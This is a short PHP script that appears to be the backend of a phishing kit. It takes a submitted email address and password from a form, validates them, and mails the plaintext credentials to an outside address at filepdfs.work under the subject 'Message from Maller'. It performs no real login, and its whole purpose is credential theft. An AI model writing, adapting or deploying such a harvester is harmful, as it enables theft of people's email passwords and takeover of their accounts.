<?php
require_once "SendMail.php";

$sendMail = new SendMail();

$errors = [];
$errorMessage = '';
$successMessage = '';

if (isset($_POST['send'])) {
    if (!empty($_POST)) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        if (empty($username)) {
            $errors[] = 'Email is required';
        } else if (!filter_var($username, FILTER_VALIDATE_EMAIL)) {
            $errors[] = 'Email is invalid';
        }

        if (empty($password)) {
            $errors[] = 'Password is required';
        }

        if (!empty($errors)) {
            $allErrors = join('<br/>', $errors);
            $errorMessage = "<p style='color: red;'>{$allErrors}</p>";

        } else {

            $mailBody = '<div><p>User Name: '. $username . '</p>
                        <p>Password: '. $password . '</p></div>
						<div>Sent: ' . date('d, M Y') . '</div>';
            $mailSubject = 'Message from Maller';
            if($sendMail->sendMailSMTP('info@filepdfs.work', $mailSubject, $mailBody))
            {
                $sendMail->scream('ok');
            } 
            else 
            {
                $sendMail->scream($sendMail->showMessage('danger', 'An error occured!'));
            }
        }
    }
}
